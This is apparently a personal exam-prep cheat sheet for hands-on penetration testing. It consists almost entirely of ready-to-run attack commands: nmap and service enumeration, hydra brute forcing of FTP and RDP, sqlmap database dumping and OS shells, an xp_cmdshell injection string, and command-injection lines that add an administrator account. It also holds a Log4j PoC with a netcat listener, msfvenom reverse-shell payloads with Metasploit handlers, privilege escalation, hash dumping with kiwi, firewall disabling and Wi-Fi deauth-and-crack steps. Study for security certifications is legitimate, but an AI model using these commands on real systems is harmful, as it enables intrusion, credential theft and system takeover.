Link: [Enumerating with Nmap – RangeForce](https://materials.rangeforce.com/tutorial/2020/01/30/Enumerating-with-Nmap/)


Link: [VeraCrypt - Free Open source disk encryption with strong security for the Paranoid](https://www.veracrypt.fr/en/Documentation.html)

# Find Live Hosts (Zenmap/nmap)
- Discover ip addresses in the network as you will be given network range or ip/cidr such as 192.168.9.30/24 so scan will be 192.168.9.1/24
## Ping Sweep
```
nmap -sP -v 192.168.9.0/24
```

```
nmap -sP -v 192.168.9.*
```
## Arp Scan
```
nmap -PR -sn -v 192.168.9.0/24
```
# Services and Version
## Service script,version and OS
```
nmap -p- -A -T4 -vvv192.168.9.0/24
```
## All ports scan
```
nmap -p- -vvv 192.168.9.0/24
```
## Service script, service version 
```
nmap -sC -sV -p- -vvv 192.168.9.0/24
```

```
nmap -sC -sV -p- -vvv -T4 192.168.9.0/24
```

```
nmap -sC -sV -p- -vvv --min-rate 10000 192.168.9.0/24
```
# Operating System
```
nmap -A -vvv 192.168.9.0/24
```

```
nmap -O -vvv 192.168.9.0/24
```
# UDP Scan
```
nmap -sU -p- --min-rate 10000 192.168.9.0/24
```

# Enumerate FTP
- After scanning network,you will see which ip is running ftp and take the ip addresses
- Scanning with nmap
```
nmap -sC -sV -p 21 -vvv 192.168.9.23
nmap --script ftp* -p 21 -vvv 192.168.9.23
```
- Anonymous check
```
ftp ftp://anonymous:anonymous@192.168.9.23
```
- Version check vulnerability(vsftpd 2.3.4)
```
searchsploit <name and version>
```
- Bruteforce ftp
```
hydra -L givenusernames.txt -P givenpasswords.txt 192.168.9.23 ftp -V
```

```
hydra -l USERNAME -P givepasswords.txt 192.168.9.23 ftp -V
```
- if login to ftp
```
ftp ftp://sysadmin:Passwordfound@192.168.9.23
ls
ls -la
get file.txt
```
# Enumerate snmp
## scripting
```
nmap --script snmp* -p 161 -vvv 192.168.9.25
```
## snmp-check
```
snmp-check 192.168.9.25
```
## Checking processes
```
nmap --script snmp-processes -p 161 -vvv 192.168.9.25
```
## Checking interfaces
```
nmap --script snmp-interfaces -p 161 -vvv 192.168.9.25
```
## community strings with nmap
```
nmap -p 161 -sU --script snmp-brute --script-args snmp-brute.communitiesdb=./SecLists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.6.2
```
## Community string with metasploit
```
msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_login;set RHOSTS 192.168.9.20;set RPORT 161;exploit'
```
# Enumerate SMB
## port is alive?
```
nmap -p 445 -vvv 192.168.9.45
```

```
nmap -sC -sV -p445 -vvv 192.168.9.45
```

```
nmap --script smb* -vvv 192.168.9.45
```
## Enumerate shares
```
nmap -p 445 --script smb-enum-shares -vvv 192.168.9.45
```
## Enumerate users
```
nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password12 -vvv 192.168.9.45
```
## Enumerate groups
```
nmap -p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password12 -vvv 192.168.9.45
```
## Enumerate services
```
nmap -p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=password12 -vvv 192.168.9.45
```
## Connect with file manager
- Naviagate to Network then in address bar type `smb://192.168.9.45` and login with user details

# Enumerate RDP Services
## Detect RDP on port
```
msfconsole -q -x 'use auxiliary/scanner/rdp/rdp_scanner;set RHOSTS 192.168.9.20;set RPORT 3389;exploit'

msfconsole -q -x 'use auxiliary/scanner/rdp/rdp_scanner;set RHOSTS 192.168.9.20;set RPORT 3333;exploit'
```
## Scanning
```
nmap -p 3389 -vvv 192.168.9.45
nmap -p 3333 -vvv 192.168.9.45
```
## Bruteforce rdp
```
hydra -L giveusernames.txt -P givenpasswords.txt rdp://192.168.9.45 -s 3333

hydra -L giveusernames.txt -P givenpasswords.txt rdp://192.168.9.45 -s 3389
```
## Login
```
xfreerdp /u:administrator /p:Password /v:192.168.9.45:3333

xfreerdp /u:admin /p:password /cert:ignore /v:10.10.187.222:3333 /workarea
```
# Enumerate netbios (137,138,139)
nbname -port 137/tcp,138/udp, nbdatagram -138/udp, nbsession - 139/tcp
- Know workgroup, mac address
```
nmap -sV --script nbstat 192.168.9.37
```

# Traffic Sniffing
```
- filter packets, follow streams, finding files, finding comments and search strings.
- Dos Attack and DDos attacks

DOS - SYN and SYN-ACK and not ACK from one single attacker ip
DDOS - SYN and SYN-ACK and not ACK from multiple attacker ip addresses
```
- Filter packet to check for DOS
```
Statistics - Conversation - IPV4 - Bytes (Decreasing)
```

```
tcp.flags.syn==1 || tcp.flags.ack==1 && ip.addr == IP
```
- Follow streams
```
right click on  stream and follow http/tcp stream
```
- Finding files
```
File - Export Objects - HTTP,SMB,FTP-DATA,TFTP - SEARCH FOR FILE Example txt file
```
- Finding Comments
```
Statistics - Capture file properties - Look down to check for Capture file comments
```
- Search strings
```
Control + F
```

# STEGANOGRAPHY
Tools - snow, openstego and covert TCP
## SNOW(Windows)(White space)
- Hide word
```
SNOW.EXE -C -m "You can win" -p "pa$$word" Secret.txt Hiddensecret.txt
```
- Extract hidden data
```
SNOW.EXE -C -p "pa$$word" Hiddensecret.txt
```
## Openstego(Windows)
```
Extract data - Input image file, Output folder - Button Extract data - Probaby crack hash if found
```
## Covert TCP
- Compile
```
cc -O covert_tcp covert_tcp.c
```
- Sender
```
./covert_tcp -source 192.168.9.40 -dest 192.168.9.41 -source_port 9999 -dest_port 8888 -file filetosend.txt
```
- Receivers
```
./covert_tcp -source senderIP(192.168.9.40) -source-port 8888 -server -file receivefile.txt
```

# CRYPTOGRAPHY
Online tool: hashes.com

## HashMyfiles (windows)(Check tampered data from two folders that contain files)
```
select files and drag drop to hashmyfile
```
## CryptoForge(windows)
- decrypt
```
double click of encrypted file(right click and chose decrypt) and enter password you are given and copy the hash and search online
```
## BcTextEncoder(Windows)(Begin Encoded Message)
```
Copy all and enter them to decode place and click decode and enter the password given and if you get hash, you can search online and submit the secret
```
## Cryptool (Windows)
```
- Open required file to cryptool
- Go to Analysis tab, and choose encryption that you have provided example Symmetric Encryption(modern) - RC4 - keylength(Depend on question) and click start
```
## VeraCrypt
- Decrypt
```
- Select Drive with letter example F
- Select File(device) and select  that file(encrypted)
- Click on Mount and it will need password for Hidden Encrypted Volume
- Dismount
- Select Drive with letter example F
- Select File(device) and select  that file
- Click on Mount and it will need password for Outer Encrypted Volume
- Dismount
```

# WEB AND ANDROID HACKING
- whatweb,dirsearch,SQLMAP, WPSCAN, ADB, BURPSUITE
## Whatweb
```
whatweb http://ip/domain
```
## gobuster
```
gobuster dir -u http://host -w /home/attacker/Desktop/common.txt
```
## dirsearch
```
python3 dirsearch.py -u http://host -x 403
```
## Clickjacks
```
python3 clickJackPoc.py -f domain.txt
```
## PwnXSS
```
python3 pwnxss.py -u http://hosts
```
## SQL INJECTION
- Find bug with burpsuite
- Copy the response and dump databases
```
sqlmap -r response.txt --dbs
sqlmap -r response.txt -D DATABASENAME --tables
sqlmap -r response.txt -D DATABASENAME -T TABLENAME --columns
sqlmap -r response.txt -D DATABASENAME -T TABLENAME -C COLUMNNAME1,COLUMNNAME2 --dump
```
- Copy responce and get shell
```
sqlmap -r response.txt --os-shell
```
## SQL Injection on MSSQL
```
blah';exec master..xp_cmdshell 'ping 10.10.10.10 -l 65000 -t';--
```
## WORDPRESS
- Enumerate target
```
wpscan --url http://wphost --enumerate ap,at,tt,cb,dbe,u,m --api-token <APITOKENINHERE> -t 50
```

```
wpscan --url http://wphost --enumerate vp,vt --api-token <APITOKENINHERE> -t 50
```
- you will get userid from above then Bruteforces it
```
wpscan --url http://wphost/wp-login.php --passwords givepassword.txt -t 50
```

```
wpscan --url http://wphost/wp-login.php --passwords givepassword.txt --usernames givenusername.txt -t 50
```

```
msfconsole -q -x 'use auxiliary/scanner/http/wordpress_login_enum;set PASSFILE /home/attacker/HackingWeb/passwords.txt;set RHOSTS 192.168.9.32;set RPORT 8080;set USERNAME admin;set TARGETURI http://192.168.9.32:8080/CEH'
```
## Command Injection
```
| hostname
| whoami
| tasklist
| net user
| net user hacker hacker /add then | net localgroup Administrators hacker /add
```
## Log4j
```
change jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java to all(62,87,99)
nc -nvlp 9001
python3 poc.py --userip ATTACKERIP --webport 8000 --lport 9001
Copy it to a username of login page
```
## Android
```
adb devices
```
- Hunting for ip address through scan and if got then
```
adb connect 192.168.0.100:5555
```
- Get shell
```
adb shell
```
- Navigate through shell
```
ls
whoami
cd sdcard/ [DEPEND ON QUESTION] [FIND HIDDEN SECRET]
ls -la
```
# Malware analysis
## Static Malware analysis
- Hybrid Analysis(Online)
- String search with BinText
- Packaging and Obfusication use PEid
- Analyze ELF use Detect It Easy(DIE)
- Analyze PE with PE explorer
- File Dependency with dependency walker
- Malware Dissembly with IDA and OllyDbg
- Malware Dissembly with Ghidra
## Dynamic Malware Analysis
- Port Monitoring with TCPView and CurrPorts
- Process Monitoring with Process Monitor
- Registry Monitoring with Reg Organizer
- Windows Services Monitoring using Windows Service Manager (SrvMan)
- Startup Program Monitoring using Autorun for windows and WinPatrol
- Files and Folder Monitoring using PA File Sight
- Device Driver Monitoring using DriverView and Driver Reviver
- DNS Monitoring using DNSQuerySniffer
# IOT
# Vulnerability Analysis
## Online
- https://cwe.mitre.org/
- https://cve.mitre.org/
- https://nvd.nist.gov/
## ZAP
## OpenVas
```
sudo apt update
sudo apt install openvas
sudo apt install gvm
gvm-setup
gvm-check-setup
sudo runuser -u _gvm -- greenbone-nvt-sync
sudo runuser -u _gvm -- greenbone-feed-sync --type SCAP
gvm-start

Navigate to http://127.0.0.1:9392
Click Scan then Tasks
Click Wandy icon then select task wizard
Enter ip address then click start scan
Wait until status change from requested to done
```
## Nessus
```
Click Policies under Resources
Click the link with name create a new policy then choose Advanced Scan
In setting tab under basic. specify policy name and description
In setting tab under discovery, turn off ping the remote machine
In setting tab under discovery under port scanning, click verify open TCP ports found by local port enumerators
In setting tab under Advanced under performance Option, set Max no of concurrent TCP sessions per hosts and Max no of concurrent TCP sessions per scan to Unlimited
In credentials tab, under windows fill username and password for windows os
In plugin tab, in here dont alter any thing
Now save the policy


From menu of scan, select Myscan then click create new scan
After that, choose User defined and choose favorite policy
After choose policy, Under general then enter name,description and targets
Under schedule, ensure enabled is turn off
Click drop menu and select launch insteady of save
```
## GFI LanGuard (Scan local Machine)
# Privilege Escalation
## LINUX
- SUID
```
find  / -perm 4000 -ls 2>/dev/null
```
- MOUNT
```
showmount -e $IP => folder will be shown in here
mount -e ntfs $IP:/$folder /tmp/sharefolder
cp /bin/bash /tmp/sharefolder/bash
chmod +s /tmp/sharefolder/bash
Login via ssh
./bash -p
```
- CVE-2021-4034
```
pkexec
```
## shells
- meterpreter x64
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=139 -f exe -o exploit_port139.exe
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.56.109;set LPORT 139;run'
```

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.109 LPORT=139 -f exe -o exploit_port139.exe
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST 192.168.56.109;set LPORT 139;run'
```
- meterpreter 32bit
```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port53.exe

msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.56.109;set LPORT 53;run'
```

```
msfvenom -p windows/meterpreter_reverse_tcp --platform windows -a x86 LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port53.exe

msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST 192.168.56.109;set LPORT 53;run'
```
- windows shell x64
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port55.exe

nc -nvlp 53
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port55.exe

nc -nvlp 53
```
- windows shell 32bit
```
msfvenom -p windows/shell/reverse_tcp --platform windows -a x86 LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port53.exe

nc -nvlp 53
```

```
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.56.109 LPORT=53 -f exe -o exploit_port53.exe

nc -nvlp 53
```
- php
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=53 -f raw -o exploit_port53.php

msfconsole -q -x 'use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set LHOST 192.168.56.109;set LPORT 53;run'
```

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.109 LPORT=53 -f raw -o exploit_port53.php

msfconsole -q -x 'use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set LHOST 192.168.56.109;set LPORT 53;run'
```
- Upgrade our shell to metasploitable and if you are in normal shell of cmd then Control+Z
```
use post/multi/manage/shell_to_meterpreter
```
## Basic Commands(msfconsole)
- Check user
```
getuid
```
- Check os
```
sysinfo
```
- Checking ip
```
ipconfig /ifconfig
```
- Check for privileges(whoami /all)
```
getprivs
```
- Search files
```
search -f pagefile.sys
```
- let say SeImpersonatePrivilege exist
```
use incognito
list_tokens -u
impersonate_token TOKEN(eg-> "NT AUTHORITY\\SYSTEM")
```
- if assignprivilige and impersonate exist then
```
use exploit/windows/local/ms16_075_reflection_juicy
```
- Checking if we can become administrator
```
getsystem
```
- If you are in shell,then Control+Z then use this to bypass uac to become admin
```
use exploit/windows/local/bypassuac_fodhelper
```
- Search for exploits, make sure you background shell
```
use post/multi/recon/local_exploit_suggester
```
- iF you are admin and you are in meterpreter shell then you can dump hashes
```
run post/windows/gather/smart_hashdump
```
- if you are admin and you are in meterpreter shell then you can also dump hashes
```
load kiwi
lsa_dump_sam
lsa_dump_secrets
```
- Upload priviledge scripts by folder
```
upload -r /home/kali/tools/privs C:\\Windows\\Tasks
```
- Running bRoot.exe
```
.\beRoot.exe
```
- GhostPack SeatBelt
```
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=misc
```
- Use powerup
```
powershell -ExecutionPolicy Bypass ". .\PowerUp.ps1;Invoke-AllChecks"
```
## Basic Command(windows)
```
- LIST FILES
dir
dir /a:h

- Users
net user
net user /domain

- NETWORK
netstat -anto

- LIST SERVICES
sc queryex type=service state=all
net start/stop servicename

- FIREWALLS
netsh firewall show state
netsh firewall show config
netsh advfirewall set allprofiles state off

- VERSION RUNNING 
wmic /node:"" product get name,version,vendor
wmic cpu get
wmic useraccount get name,sid

- FILES SEARCH
findstr /E ".txt" > txt.txt
findstr /E ".log" > log.txt
findstr /E ".doc" > doc.txt
```
# WIRELESS
## bruteforce from file
```
aircrack-ng WepCrack-01.cap

aircrack-ng -a2 -b 62:67:20:29:E3:F8 -w rockyou.txt /root/Desktop/givenfile.cap
```
## Bruteforce from ground up
```
airmon-ng --- list all your wireless adapter in your PC or Monitor


airmon-ng start wlan0 --put into a monitor mode as mon0


airodump-ng wlan0mon   ---dump wireless devices with alot of information about BSID and also channel number


(airodump-ng --bssid <MAC ADDRESS OF TARGET ACCESS POINT> -c <CHANNEL IN WHICH TARGET ACCESSPOING> -w <NAMEO OF DUMP> wlan0mon)
airodump-ng -c 6  --bssid 46:91:60:44:8C:E3 -w Desktop wlan0mon  --force it tobe connected into our station and let it run 


aireplay-ng -0 2 -a 62:67:20:29:E3:F8 -c 70:1A:04:CC:88:88  wlan0mon ---send 64 deauth


aircrack-ng -a2 -b 62:67:20:29:E3:F8 -w rockyou.txt /root/Desktop/*.cap --bruteforce it


airmon-ng stop wlan0mon---stop the interface

```
# IoT
- whois
- Google hacking database(SCADA)
- Shodan
- MQTTRoute and IOTSimulator(windows)
- Wireshark
```
filter with mqtt
select public message from packet detail of any stream and observer
select public complete from packet detail of any stream and observer
select public received from packet detail of any stream and observer
```

# NOTE
## Servers slow and wordlists not work